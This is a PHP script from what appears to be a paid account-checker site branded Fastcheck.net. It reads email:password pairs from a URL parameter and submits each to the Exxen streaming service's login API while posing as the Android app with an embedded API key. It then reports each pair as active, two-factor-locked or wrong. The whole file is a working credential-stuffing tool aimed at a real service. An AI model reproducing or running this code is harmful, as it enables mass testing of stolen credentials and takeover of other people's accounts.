<?php
include_once '../includes/baglan.php';
session_start();
if(isset($_SESSION['uid']) && isset($_SESSION['username'])){
$username=$_SESSION['username'];
$sql = "SELECT * FROM users WHERE username = ?";
$stmt = $con->prepare($sql) or die ($con->error);
$stmt->bind_param('s',$username);
$stmt->execute();
$result_username = $stmt->get_result();
$row = $result_username->fetch_assoc();
if($row['pre']<1){

header("Location:/404.html");

}}else{

  header("Location:/auth/auth-login");
}
$lista = htmlspecialchars($_GET['lista']);
$array = explode(":",$lista);

$mail = trim($array[0]);
$pw = trim($array[1]);


$stuff = json_encode(array("Email"=>$mail,"Password"=>$pw,"RememberMe"=>1));
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://api-crm.exxen.com/membership/login/email?key=5f07276b91aa33e4bc446c54a9e982a8");
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'accept: */*',
    'accept-encoding: gzip',
    'Content-Type: application/json; charset=UTF-8',
    'Host: api-crm.exxen.com',
    'origin: com.exxen.android',
    'user-agent: com.exxen.android/1.0.0 (Android/8.1.0; en_US; brand/samsung; model/SM-T835; build/M1AJQ)',
    'x-requested-with: XMLHttpRequest',
    ));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $stuff);
$fim = curl_exec($ch);

if(strpos($fim, 'Success":true') !== false) {
	 echo "✅ <b>#Aktif</b> - $mail : $pw - Hesap Aktif - <b>www.Fastcheck.net</b> <br>";
}
elseif(strpos($fim, 'Your account is blocked') !== false) {
	echo "✅ <b>#Aktif</b> - $mail : $pw - 2 Faktör - <b>www.Fastcheck.net</b> <br>";
}
elseif(strpos($fim, 'Success":false') !== false) {
	echo "❌ <b>#Kapalı</b> - $mail : $pw - Mail Veya Şifre Hatalı! - <b>www.Fastcheck.net</b> <br>";
}
elseif(strpos($fim, 'Wrong email or password') !== false) {
	echo "❌ <b>#Kapalı</b> - $mail : $pw - Mail Veya Şifre Hatalı! - <b>www.Fastcheck.net</b> <br>";
}
elseif(strpos($fim, 'Incorrect login data') !== false) {
	echo "❌ <b>#Kapalı</b> - $mail : $pw - Mail Veya Şifre Hatalı! - <b>www.Fastcheck.net</b> <br>";
}
else{
	echo "❌ <b>#Kapalı</b> - $mail : $pw - Mail Veya Şifre Hatalı! - <b>www.Fastcheck.net</b> <br>";
}
curl_close($ch);
?>